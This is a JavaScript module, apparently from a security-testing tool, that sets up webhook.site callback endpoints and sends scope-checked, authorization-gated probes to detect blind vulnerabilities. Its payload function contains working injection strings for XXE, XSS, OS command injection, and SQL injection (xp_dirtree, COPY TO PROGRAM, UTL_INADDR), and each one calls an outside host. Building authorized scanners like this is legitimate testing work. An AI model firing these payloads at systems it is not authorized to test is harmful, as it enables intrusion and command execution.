'use strict';
// Callback providers are ordinary configured MCP connections. Values are resolved
// by the native MCP launcher; neither this module nor its records contain API keys.
const fs = require('node:fs/promises');
const path = require('node:path');
const { randomUUID, randomBytes } = require('node:crypto');
function unwrap(value) {
  if (value?.isError || value?.ok === false) throw Error(value.error || 'Callback MCP returned an error');
  let data = value?.structuredContent;
  if (!data) {
    const texts = value?.content?.filter(item => item.type === 'text').map(item => item.text) || [];
    if (texts.length) { try { data = JSON.parse(texts.join('\n')); } catch { throw Error('Callback MCP returned non-JSON content'); } }
    else data = value;
  }
  if (data?.success !== true) throw Error(data?.message || data?.error || 'Callback provider did not confirm success');
  return data.data ?? data;
}
function owner(context) { if (!context?.owner || !context?.runId) throw Error('An owned security run is required'); }
const safe = value => JSON.parse(JSON.stringify(value));
function payload(family, variant, url, dns) {
  if (family === 'ssrf') return variant === 'dns' ? dns : url;
  if (family === 'xxe') return `<?xml version="1.0"?><!DOCTYPE probe [<!ENTITY callback SYSTEM "${url}">]><probe>&callback;</probe>`;
  if (family === 'xss') return `<script>fetch(${JSON.stringify(url)},{mode:"no-cors",credentials:"omit"})</script>`;
  if (family === 'command') return variant === 'windows' ? `nslookup ${dns}` : `$(nslookup ${dns})`;
  if (family === 'sql' && variant === 'mssql') return `'; EXEC master..xp_dirtree '\\\\${dns}\\probe';--`;
  if (family === 'sql' && variant === 'postgres') return `'; COPY (SELECT '') TO PROGRAM 'nslookup ${dns}';--`;
  if (family === 'sql' && variant === 'oracle') return `' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('${dns}') FROM dual--`;
  throw Error('Choose a supported callback family and SQL dialect');
}
function inScope(value, scope) {
  let url; try { url = new URL(value); } catch { return false; }
  if (!['http:', 'https:'].includes(url.protocol) || url.username || url.password) return false;
  if (!(scope?.origins || []).some(origin => {
    if (scope.matchMode !== 'host') return origin === url.origin;
    let base; try { base = new URL(origin); } catch { return false; }
    return url.hostname === base.hostname || scope.includeSubdomains === true && !base.hostname.startsWith('[') && !/^\d{1,3}(?:\.\d{1,3}){3}$/.test(base.hostname) && url.hostname.endsWith('.' + base.hostname);
  })) return false;
  if (scope.also && !inScope(value, scope.also)) return false;
  let pathname = url.pathname;
  for (let depth = 0; depth < 5; depth++) {
    const canonical = new URL(pathname.replaceAll('\\', '/').split('/').map(x => x.split(';')[0]).join('/').replace(/\/{2,}/g, '/'), url.origin).pathname;
    if ((scope.excludePaths || []).some(x => x === '/' || canonical === x || canonical.startsWith(x.endsWith('/') ? x : x + '/'))) return false;
    let decoded; try { decoded = decodeURIComponent(pathname); } catch { return false; }
    if (decoded === pathname) return true; pathname = decoded;
  }
  return false;
}
module.exports = function createOast({ root, admit, mcpCall, onEvent = () => {}, fetchImpl = fetch }) {
  if (typeof admit !== 'function') throw Error('Callback operations require a live admission bridge');
  async function authorize(context, request) { const result = await admit({ ...context, request }); if (result === false || result?.allow === false) throw Error('Callback operation denied'); }
  const directory = path.join(root, 'oast'), records = new Map(), locks = new Map(), watchers = new Map(), activeConnections = new Map();
  const ready = (async () => {
    await fs.mkdir(directory, { recursive: true, mode: 0o700 });
    for (const name of await fs.readdir(directory)) if (/^[a-f0-9-]+\.json$/.test(name)) {
      const value = JSON.parse(await fs.readFile(path.join(directory, name), 'utf8')); records.set(value.oastId, value);
    }
  })();
  function serial(key, action) { const task = (locks.get(key) || Promise.resolve()).catch(() => {}).then(action); locks.set(key, task); task.finally(() => { if (locks.get(key) === task) locks.delete(key); }).catch(() => {}); return task; }
  async function save(record) { const file = path.join(directory, record.oastId + '.json'), tmp = file + '.tmp'; await fs.writeFile(tmp, JSON.stringify(record), { mode: 0o600 }); await fs.rename(tmp, file); }
  function owned(id, context) { const value = records.get(id); if (!value || value.owner !== context.owner) throw Error('Callback endpoint does not belong to this chat'); return value; }
  async function rpc(name, args, context, connection) {
    context.signal?.throwIfAborted();
    await authorize(context, { kind: 'control', backend: 'oast', toolName: name, connectionId: connection?.id || null });
    if (!connection?.command || !mcpCall) throw Error('Configure the managed Webhook MCP connection in MCP servers');
    return unwrap(await mcpCall(connection, name, args, context.signal));
  }
  function summary(record) { const { probes, events, ...rest } = record; return { ...rest, probes: probes.length, events: events.length, findings: events.filter(e => e.confirmation === 'callback_observed').length }; }
  async function collect(record, context, connection) {
    if (record.state === 'deleted') throw Error('Callback endpoint was deleted; retained events remain available through export');
    let page = 1, next = record.cursor, more;
    do {
      const result = await rpc('get_webhook_requests', { webhook_token: record.token, limit: 100, page, ...(record.cursor != null ? { since: record.cursor } : {}) }, context, connection);
      if (!Array.isArray(result.requests)) throw Error('Callback provider omitted its event list');
      for (const item of result.requests) {
        const id = item.uuid || item.id || item.request_id;
        if (!id) throw Error('Callback provider returned an event without an identity');
        if (record.events.some(event => event.eventId === id)) continue;
        let rawResult,detailError;
        for(let attempt=0;attempt<3;attempt++)try{rawResult=await rpc('get_request',{webhook_token:record.token,request_id:id,raw:true},context,connection);break;}catch(error){if(!/404|not found/i.test(error.message))throw error;detailError=error.message;if(attempt<2)await new Promise(resolve=>setTimeout(resolve,250*(attempt+1)));}
        const raw = rawResult ? rawResult.request || rawResult : item;
        const encoded = JSON.stringify(raw), probe = record.probes.find(probe => encoded.includes(probe.marker));
        const headers = Object.fromEntries(Object.entries(raw.headers || {}).map(([key, value]) => [key.toLowerCase(), value]));
        let source = 'unattributed', confirmation = 'unmatched';
        if (probe) {
          // Node's fetch also emits Sec-Fetch-Mode. It alone is not evidence
          // that a browser caused the callback; all attribution remains a candidate.
          const browser = headers['sec-fetch-site'] || headers['sec-ch-ua'] || probe.family === 'xss';
          source = probe.purpose === 'self_test' ? 'self_test' : browser ? 'browser_candidate' : probe.executed ? 'server_candidate' : 'ambiguous';
          confirmation = source === 'self_test' ? 'self_test' : 'callback_observed';
        }
        record.events.push({ eventId: id, probeId: probe?.probeId || null, receivedAt: new Date().toISOString(), source, confirmation, raw, ...(rawResult?{}:{detailError,partial:true}) });
      }
      if (Number.isSafeInteger(result.next_since)) next = Math.max(next ?? 0, result.next_since);
      more = result.pagination?.is_last_page === false; page++;
      // Persist events before advancing the cursor. Cancellation never loses a page.
      await save(record); context.signal?.throwIfAborted();
    } while (more);
    record.cursor = next; record.lastCheckedAt = new Date().toISOString(); await save(record);
    return summary(record);
  }
  async function executeProbe(record, probe, request, context) {
    let url = request.url, method = request.method || 'GET', body = request.body, headers = request.headers || {};
    for (let hop = 0; ; hop++) {
      if (!inScope(url, context.scope)) throw Error('Callback probe target is outside scope for this run: ' + url + '. Review target scope in Workspace settings.');
      await authorize(context, { url, method, kind: 'oast_probe' });
      probe.executed = true; probe.dispatchedAt = new Date().toISOString(); await save(record);
      const response = await fetchImpl(url, { method, headers, body: ['GET', 'HEAD'].includes(method) ? undefined : body, redirect: 'manual', signal: AbortSignal.any([...(context.signal ? [context.signal] : []), AbortSignal.timeout(context.config?.requestTimeoutMs || 30000)]) });
      const text = await response.text(); probe.responses ||= []; probe.responses.push({ url, status: response.status, headers: Object.fromEntries(response.headers), body: text }); await save(record);
      if (![301,302,303,307,308].includes(response.status) || !response.headers.get('location') || !request.followRedirect) break;
      if (hop >= (request.maxRedirects ?? 10)) throw Error('Configured redirect limit reached');
      const next = new URL(response.headers.get('location'), url).href;
      if (new URL(next).origin !== new URL(url).origin) headers = Object.fromEntries(Object.entries(headers).filter(([key]) => !['authorization','cookie','proxy-authorization'].includes(key.toLowerCase())));
      if (response.status === 303 || ([301,302].includes(response.status) && method === 'POST')) { method = 'GET'; body = undefined; }
      url = next;
    }
  }
  async function dispatch(action, args = {}, context = {}) {
    await ready; owner(context); action = action.replace(/^oast\./, '');
    const connection = args.connection || context.oastConnection;
    if (action === 'status' && !args.oastId) return { available: !!connection?.command, ...(args.check ? { provider: await rpc('server_status', { check_socket: true }, context, connection) } : {}), runs: [...records.values()].filter(r => r.owner === context.owner).map(summary) };
    if (action === 'create') return serial('create:' + context.owner + ':' + context.runId, async () => {
      const previous = [...records.values()].find(r => r.owner === context.owner && r.runId === context.runId && r.state !== 'deleted'); if (previous) return summary(previous);
      const expiry = args.expirySeconds ?? 604800; if (!Number.isSafeInteger(expiry) || expiry < 1) throw Error('Callback expiry must be positive seconds');
      const value = await rpc('configure_webhook', { expiry, description: 'cert-x run ' + context.runId, default_status: 204, default_content: '' }, context, connection);
      const token = value.token || value.uuid || value.webhook?.uuid;
      if (!/^[a-f0-9-]{36}$/i.test(token || '')) throw Error('Provider did not return a callback token');
      const record = { oastId: randomUUID(), owner: context.owner, workspaceId: context.workspaceId || null, runId: context.runId, connectionId: connection.id || null, token, url: `https://webhook.site/${token}`, dns: `${token}.dnshook.site`, state: 'monitoring', createdAt: new Date().toISOString(), expirySeconds: expiry, cursor: null, probes: [], events: [] };
      // Persist the allocated endpoint before a second network operation can fail.
      records.set(record.oastId, record); await save(record);
      try { const addresses = await rpc('get_webhook_info', { webhook_token: token }, context, connection); record.url = addresses.url || record.url; record.dns = addresses.dns || record.dns; }
      catch (error) { record.providerWarning = error.message; }
      await save(record); return summary(record);
    });
    const record = owned(args.oastId, context);
    activeConnections.set(record.oastId, context.connectionId);
    if (action === 'stop') { watchers.get(record.oastId)?.abort(Error('Callback monitoring stopped')); record.state = 'stopped'; await save(record); return summary(record); }
    return serial(record.oastId, async () => {
      if (action === 'export') return { ...summary(record), probes: safe(record.probes), events: safe(record.events) };
      if (action === 'cleanup') { if (record.state !== 'deleted') { await save(record); await rpc('delete_webhook', { webhook_token: record.token }, context, connection); record.state = 'deleted'; await save(record); } return summary(record); }
      if (action === 'status') return summary(record);
      if (record.connectionId && record.connectionId !== connection?.id) throw Error('Use the callback connection that created this endpoint');
      if (action === 'probe') {
        if (record.state === 'deleted') throw Error('Callback endpoint was deleted');
        const marker = randomBytes(16).toString('hex'), probeId = randomUUID(), url = record.url.replace(/\/$/, '') + '/' + marker, dns = marker + '.' + record.dns;
        const value = payload(args.family || 'ssrf', args.variant, url, dns);
        const probe = { probeId, marker, family: args.family || 'ssrf', variant: args.variant || null, purpose: args.purpose === 'self_test' ? 'self_test' : 'test', url, dns, payload: value, createdAt: new Date().toISOString(), executed: false };
        record.probes.push(probe); await save(record);
        if (args.execute === true) {
          if (!args.request || !JSON.stringify(args.request).includes('{{OAST_')) throw Error('Execution requires an explicit request with an OAST placeholder');
          const substitute = input => typeof input === 'string' ? input.replaceAll('{{OAST_PAYLOAD}}', value).replaceAll('{{OAST_URL}}', url).replaceAll('{{OAST_DNS}}', dns) : Array.isArray(input) ? input.map(substitute) : input && typeof input === 'object' ? Object.fromEntries(Object.entries(input).map(([key,v]) => [key,substitute(v)])) : input;
          probe.request = substitute(args.request);
          try { await executeProbe(record, probe, probe.request, context); } catch (error) { probe.error = error.message; await save(record); throw error; }
        }
        return safe(probe);
      }
      if (action === 'events' || action === 'wait') {
        if (record.state === 'stopped' && args.refresh !== false) return { ...summary(record), events: safe(record.events), notice: 'Monitoring is stopped; retained events only' };
        if (action === 'wait') {
          const seconds = args.timeoutSeconds ?? 30; if (!Number.isInteger(seconds) || seconds < 1 || seconds > 120) throw Error('Callback wait must be 1–120 seconds; repeat using the stored cursor for longer observation');
          const watcher = new AbortController(); watchers.set(record.oastId, watcher);
          try { await rpc('wait_for_request', { webhook_token: record.token, timeout_seconds: seconds, return_existing: true }, { ...context, signal: AbortSignal.any([watcher.signal, ...(context.signal ? [context.signal] : [])]) }, connection); }
          finally { if (watchers.get(record.oastId) === watcher) watchers.delete(record.oastId); }
        }
        if (args.refresh !== false) await collect(record, context, connection);
        const offset = args.offset ?? 0, limit = args.limit ?? 50;
        if (!Number.isSafeInteger(offset) || offset < 0 || !Number.isSafeInteger(limit) || limit < 1 || limit > 500) throw Error('Invalid event page');
        const events = record.events.slice(offset, offset + limit);
        onEvent({ owner: record.owner, runId: record.runId, kind: 'oast', events: events.length });
        return { ...summary(record), events: safe(events), nextOffset: offset + limit < record.events.length ? offset + limit : null, notice: record.events.length ? 'Callback attribution requires inspection; an observed callback alone does not establish impact' : 'No callback observed' };
      }
      throw Error('Unknown callback action');
    });
  }
  async function cancel(runId, connectionId) { await ready; for (const record of records.values()) if ((!runId || record.runId === runId) && (!connectionId || activeConnections.get(record.oastId) === connectionId)) { watchers.get(record.oastId)?.abort(Error('Callback monitoring stopped')); if(record.state==='monitoring'){record.state='stopped';await save(record);} } }
  return { dispatch, cancel, disconnect: connectionId => cancel(null, connectionId), status: async () => ({ available: !!mcpCall, provider: 'webhook-mcp-server', version: '3.0.0' }), close: async () => { for (const watcher of watchers.values()) watcher.abort(); await ready; await Promise.allSettled([...locks.values()]); } };
};
module.exports.unwrap = unwrap;
module.exports.inScope = inScope;
